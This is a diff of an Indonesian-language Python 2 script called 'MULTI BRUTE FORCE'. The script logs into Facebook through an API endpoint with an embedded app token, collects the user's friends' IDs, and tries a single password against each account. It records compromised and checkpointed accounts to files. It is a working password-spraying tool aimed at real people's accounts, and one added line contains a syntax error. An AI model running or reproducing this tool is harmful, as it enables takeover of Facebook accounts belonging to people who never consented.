@@ -36,12 +36,12 @@ def banner():
                    /+/++//
                   /+/++//
           *   *  /+/++//
-           \ /  |/__//
-         {X}v{X}|MBF|==========.
+           \ /  |/___//
+         {X}v{X}| MBF|>>>>>>>>>>+.
            [']  /'|'\           \\
-               /  \  \           '
+          \rm     /  \  \           '
                \_  \_ \_  
-     \rwCreated by \raIqbal Dev
+     \rw     Created by \raIqbal Dev
      \rw+==============================+
      \ra|       MULTI BRUTE FORCE      |
      \rw+==============================+''')
@@ -49,8 +49,8 @@ def banner():
 
 def login():
     banner()
-    user_name = raw_input(pu+"  [log]" + a + " Username" + h + ":")
-    password = raw_input(pu+"  [log]" + a + " Password" + h + ":")
+    user_name = raw_input(p+"  [log]" + a + " Username" + pu + ":")
+    password = raw_input(p+"  [log]" + a + " Password" + pu + ":")
     req = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user_name+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
     
     dev = req.content
@@ -79,11 +79,13 @@ def id_teman():
             for ival in jsl['data']:
                 id_konco.append(ival['id'])
                 simpan_id.write(ival['id'] + "\n")
-                data_id = open("id.txt", "r")
-                idlis = data_id.read().split()
-                sys.stdout.write("\r Mengambil ID Teman => " + len(str(data_id)) + "/" + str(idlis))
+                data_id = open("id.txt", 'r').read().split()
+                sys.stdout.write("\r \033[95m [$]\033[92m Mengambil ID Teman \033[97m=> " + str(len(data_id)) 
                 sys.stdout.flush()
             simpan_id.close()
+            print a+"  ID Tersimpan " + p + "(" + w + "id.txt" + p + ")" 
+            print 
+            raw_input(h+"["+w+"Lanjutkan Bos.."+h+"]\n")
 
         except IOError:
             print m+" Terjadi kesalahan..."
@@ -104,9 +106,6 @@ def mbf():
         os.system('clear')
         print
         banner()
-  #      print pu+"  +==============================+"
-  #      print a+"  |       MULTI BRUTE FORCE      |"
-  #      print pu+"  +==============================+"
         file_id = raw_input(h+"  [MBF]" + a + " Masukkan File ID" + p + ": ")
         password = raw_input(h+"  [MBF]" + a + " Masukkan Password" + p + ": ")
         print
@@ -127,9 +126,7 @@ def mbf():
 
 def mbfcrack():
     
-    global baris
-    global dados, gagal
-    global oradadi, count
+    global count
     
     try:
         data_lis = open(file_id, "r")
@@ -139,8 +136,6 @@ def mbfcrack():
             url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + password + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
             Iq_data = urllib.urlopen(url)
             jsl = json.load(Iq_data)
-            if count == len(baris):
-                break
             if "access_token" in jsl:
                 sukses = open("Dadi.txt", 'w')
                 sukses.write(user + " | " + password + "\n")
@@ -157,30 +152,26 @@ def mbfcrack():
                 else:
                     oradadi.append(user)
                     count += 1
-            sys.stdout.write(pu+ "\r [$]" + a + " Crack " + p + str(len(baris)) + pu + " / " + p + str(count) + m + " []" + h + " LIVE = " + str(len(dados)) + pu + " | " + k + "CEKPO = " + str(len(gagal)))
+            sys.stdout.write(pu+ "\r [$]" + a + " Crack " + p + str(len(baris)) + pu + " / " + p + str(count) + m + " [ " + h + str(len(dados)) + pu + " / " + k + str(len(gagal)) + m + " ]")
             sys.stdout.flush()
+        
 
     except IOError:
         print
         print m+" Gangguan koneksi.."
-
-def hasil_crack():
-    print
-    print
+    print 
+    print 
     for ipal in dados:
         print ipal
-        
     for ival in gagal:
         print ival
+    print m+ " Bosok => "str(len(oradadi))
 
-    print 
-    print m+ " Gagal " + str(len(oradadi))
 
 def main():
     login()
     id_teman()
     mbf()
-    hasil_crack()
 
 if __name__=="__main__":
     main()
